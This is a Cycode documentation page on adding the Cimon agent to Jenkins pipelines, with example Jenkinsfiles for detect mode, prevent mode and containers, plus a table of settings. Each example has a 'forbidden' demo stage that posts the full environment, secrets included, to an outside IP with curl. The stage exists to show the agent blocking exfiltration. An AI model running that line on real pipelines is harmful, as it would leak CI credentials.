# Jenkins | Cycode Docs

Source: https://docs.cycode.com/scanners/pipeline-security/cimon/integrations/jenkins

---

# Jenkins

[](https://gitlab.com/cycodehq/documentation/cycode_docs/-/blob/main/src/content/scanners/pipeline-security/cimon/integrations/jenkins.md "Edit this page")

Updated on Jun 13, 2024 • Published on May 26, 2024

* * *

Jenkins does not offer out-of-the-box hosted runners like GitHub Actions and Azure Pipelines, but provides great flexibility to use self-hosted runners of varying execution types.

## Jenkins self-hosted runners support [Copied!](#jenkins-self-hosted-runners-support "Copy link to this section")

In Jenkins, there are two types of executions:

*   Creating virtual or physical nodes that will execute jobs
*   Setting up a cloud (e.g., Docker-based, K8s-based, etc.) that will provision the job

Both cases require the underlying operating system to support the minimal requirements for running eBPF code and loading it. You can find more information in the [self-hosted support](/scanners/pipeline-security/cimon/integrations/jenkins) and at [FAQ](/scanners/pipeline-security/cimon/ci-mon-faqs) section.

### Kubernetes support [Copied!](#kubernetes-support "Copy link to this section")

If you’re using K8s-based runners, refer to the [kubernetes guidelines](/integrations/cloud-and-infrastructure-services/kubernetes) .

## Cimon Jenkins pipeline [Copied!](#cimon-jenkins-pipeline "Copy link to this section")

Jenkins supports running Cimon on all major pipeline types - “Freestyle project”, “Pipeline”, and “Multibranch Pipeline”. As an example, here is a Jenkinsfile that creates a build and runs Cimon:

## Detect Mode [Copied!](#detect-mode "Copy link to this section")

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
```

```groovy
pipeline {
    agent any

    options {
        disableConcurrentBuilds()
    }

    stages {
        stage('Install Cimon') {
            steps {
                sh 'curl -sSfL https://cimon-releases.s3.amazonaws.com/install.sh | sudo sh -s -- -b /usr/local/bin'
            }
        }

        stage('Run Cimon') {
            environment {
                CIMON_CLIENT_ID = credentials("cimon-client-id")
                CIMON_SECRET = credentials("cimon-secret")
            }
            steps {
                sh 'sudo -E cimon agent start-background'
            }
        }

        stage('Test') {
            steps {
                sh 'git clone https://github.com/octocat/Hello-World Hello-World'
            }
        }

        stage('Allowed network traffic') {
            steps {
                sh 'curl -sm 1 https://34.121.34.97 || true'
            }
        }

        stage('Allowed network traffic (hostname)') {
            steps {
                sh 'wget --quiet --timeout 1 https://cycode.com || true'
                sh 'wget --quiet --timeout 1 https://registry.npmjs.org || true'
            }
        }

        stage('Forbidden network traffic (IP)') {
            steps {
                sh 'curl -sm 1 -d "$(env)" https://34.121.34.100/upload/v2 || true'
            }
        }

        stage('Forbidden network traffic (hostname)') {
            steps {
                sh 'wget --quiet --timeout 1 https://yahoo.com || true'
            }
        }
    }
    post {
        always {
            sh 'sudo -E cimon agent stop'
        }
    }
}
```

## Prevent Mode [Copied!](#prevent-mode "Copy link to this section")

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
```

```hcl
pipeline {
    agent any

    environment {
        CIMON_PREVENT = "1"
        CIMON_ALLOWED_HOSTS = """
            github.com
            registry.npmjs.org
            cycode.com
        """
        CIMON_ALLOWED_IPS = """
            34.121.34.97
        """
    }

    options {
        disableConcurrentBuilds()
    }

    stages {
        stage('Install Cimon') {
            steps {
                sh 'curl -sSfL https://cimon-releases.s3.amazonaws.com/install.sh | sudo sh -s -- -b /usr/local/bin'
            }
        }

        stage('Run Cimon') {
            environment {
                CIMON_CLIENT_ID = credentials("cimon-client-id")
                CIMON_SECRET = credentials("cimon-secret")
            }
            steps {
                sh 'sudo -E cimon agent start-background'
            }
        }

        stage('Test') {
            steps {
                sh 'git clone https://github.com/octocat/Hello-World Hello-World'
            }
        }

        stage('Allowed network traffic') {
            steps {
                sh 'curl -sm 1 https://34.121.34.97 || true'
            }
        }

        stage('Allowed network traffic (hostname)') {
            steps {
                sh 'wget --quiet --timeout 1 https://cycode.com || true'
                sh 'wget --quiet --timeout 1 https://registry.npmjs.org || true'
            }
        }

        stage('Forbidden network traffic (IP)') {
            steps {
                sh 'curl -sm 1 -d "$(env)" https://34.121.34.100/upload/v2 || true'
            }
        }

        stage('Forbidden network traffic (hostname)') {
            steps {
                sh 'wget --quiet --timeout 1 https://yahoo.com || true'
            }
        }
    }
    post {
        always {
            sh 'sudo -E cimon agent stop'
        }
    }
}
```

## Step by Step Explanation [Copied!](#step-by-step-explanation "Copy link to this section")

```
1
2
3
4
```

```groovy
environment {
    CIMON_CLIENT_ID = credentials("cimon-client-id")
    CIMON_SECRET = credentials("cimon-secret")
}
```

Cimon receives input parameters through environment variables. Security policies will be configured by these variables.

```
1
2
3
```

```groovy
options {
    disableConcurrentBuilds()
}
```

To enforce Cimon installation step running first, this configuration option must be enabled.

```
1
2
3
4
5
```

```groovy
stage('Install Cimon') {
    steps {
        sh 'curl -sSfL https://cimon-releases.s3.amazonaws.com/install.sh | sudo sh -s -- -b /usr/local/bin'
    }
}
```

Installing Cimon agent on the runner. This step doesn’t runs the agent yet.

```
1
2
3
4
5
```

```groovy
stage('Run Cimon') {
    steps {
        sh 'sudo -E cimon agent start-background'
    }
}
```

Running Cimon agent in background. Once this step is over successfully, Cimon is tracing all activility according to configuration given.

```
1
2
3
4
5
```

```groovy
post {
    always {
        sh 'sudo -E cimon agent stop'
    }
}
```

Cimon agent is stopped, and the report is printed.

### Running Cimon in a Container [Copied!](#running-cimon-in-a-container "Copy link to this section")

The Jenkins builds generally use a new container for every build, which helps to clean up the environment and ensure that one build doesn’t interfere with another one. Additionally, Cimon could interfere with one another due to running on the same kernel if several Jenkins executors are run on the same agent without sufficient isolation.

Therefore, when running Cimon inside a container, Cimon can isolate the execution context to only the specified container, allowing Jenkins to run multiple builds with prevention policies simultaneously.

In this example, Cimon is running inside a container:

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
```

```hcl
pipeline {
    agent {
        docker {
            image 'ubuntu:22.04'
            args '--user="root" --privileged'
        }
    }

    environment {
        CIMON_PREVENT = "1"
        CIMON_ALLOWED_HOSTS = """
            github.com
            registry.npmjs.org
            cycode.com
        """
        CIMON_ALLOWED_IPS = """
            34.121.34.97
        """
    }

    options {
        disableConcurrentBuilds()
    }

    stages {
        stage('Install Cimon') {
            steps {
                sh 'apt update && apt install curl wget -y'
                sh 'curl -sSfL https://cimon-releases.s3.amazonaws.com/install.sh | sh -s -- -b /usr/local/bin'
            }
        }

        stage('Run Cimon') {
            steps {
                sh 'cimon agent start-background'
            }
        }

        stage('Allowed network traffic') {
            steps {
                sh 'curl -sm 1 https://34.121.34.97 || true'
            }
        }

        stage('Allowed network traffic (hostname)') {
            steps {
                sh 'wget --quiet --timeout 1 https://cycode.com || true'
                sh 'wget --quiet --timeout 1 https://registry.npmjs.org || true'
            }
        }

        stage('Forbidden network traffic (IP)') {
            steps {
                sh 'curl -sm 1 -d "$(env)" https://34.121.34.100/upload/v2 || true'
            }
        }

        stage('Forbidden network traffic (hostname)') {
            steps {
                sh 'wget --quiet --timeout 1 https://yahoo.com || true'
            }
        }
    }
    post {
        always {
            sh 'cimon agent stop'
        }
    }
}
```

The printed Cimon report (and policies that follow) pertain to the container’s processes and network connections. Therefore, the host environment will be unaffected, allowing only control of the build process inside the container.

### Usage [Copied!](#usage "Copy link to this section")

Here are the parameters that are supported:

Environment Variable

Default

Description

`CIMON_CLIENT_ID`

Cimon client ID for authentication

`CIMON_SECRET`

Cimon secret for authentication

`CIMON_URL`

Cimon endpoint for authentication

`CIMON_PREVENT`

`false`

Enable prevention mode

`CIMON_ALLOWED_IPS`

A comma or white space separated list of allowed IP addresses

`CIMON_ALLOWED_HOSTS`

A comma or white space separated list of allowed domain names. The left-most label can be the wildcard character (`*`) to match multiple subdomains (e.g. `*.example.com`).

`CIMON_IGNORED_IP_NETS`

A comma or white space separated list of ignored IP networks in CIDR notation, e.g. 10.0.0.0/8, 172.16.0.0/12. This setting is mandatory if your workflow runs containers attached to a custom network with configured sub-range. In other words, inter-container networking is usually ignored by Cimon. Cimon implicitly ignores 10.0.0.0/8 and 172.16.0.0/12 networks.

`CIMON_REPORT_PROCESS_TREE`

`false`

Enable to report the process tree

`CIMON_SLACK_WEBHOOK_ENDPOINT`

Slack webhook endpoint to report security events

`CIMON_LOG_LEVEL`

`info`

Log level (Used for debugging)

## Report [Copied!](#report "Copy link to this section")

The final report is printed in the build logs of each job by Cimon.

## Interesting use-cases for Jenkins integrations [Copied!](#interesting-use-cases-for-jenkins-integrations "Copy link to this section")

Besides the policies, such as detecting hardcoded secrets and various CI/CD policies, we’re able to enrich code-to-cloud visibility, and allow some of the following:

*   Query all the relevant information from the Jenkins instance, such as configuration, plugins, instance version, and other pieces of data
*   Show all Jenkins jobs and runs
*   Correlate Jenkins jobs to the respective Github (or other SCM) repositories
*   Identify all images built in Jenkins jobs, and correlate these with the cloud, or any vulns scanned for the images

Was this article helpful?

Yes No

Thanks for your feedback!

## Help us improve this article

×

Need more information Inaccurate or irrelevant content Difficult to understand Missing/broken link Others

Characters: 0/255

Cancel Submit
